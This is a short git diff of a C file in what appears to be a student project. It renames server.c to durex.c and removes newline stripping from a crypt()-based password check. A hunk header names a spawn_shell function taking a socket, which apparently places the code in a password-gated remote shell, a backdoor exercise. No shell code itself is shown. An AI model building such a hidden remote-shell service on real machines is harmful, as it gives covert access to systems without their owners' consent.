@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   server.c                                           :+:      :+:    :+:   */
+/*   durex.c                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/11/15 19:41:10 by bccyv             #+#    #+#             */
-/*   Updated: 2021/11/24 20:54:05 by bccyv            ###   ########.fr       */
+/*   Updated: 2021/12/05 13:05:11 by lfalkau          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -78,13 +78,9 @@ int spawn_shell(t_cli *client, int sockfd)
 static int checkpass(char *buf, const char *salt, const char *hashref)
 {
 	char *hash;
-	char *tmp = buf;
 
 	if (buf == NULL || hashref == NULL)
 		return (-1);
-	while (*tmp && *tmp != '\n')
-		tmp++;
-	*tmp = '\0';
 	hash = crypt(buf, salt);
 	return (strcmp(hash, hashref) == 0);
 }
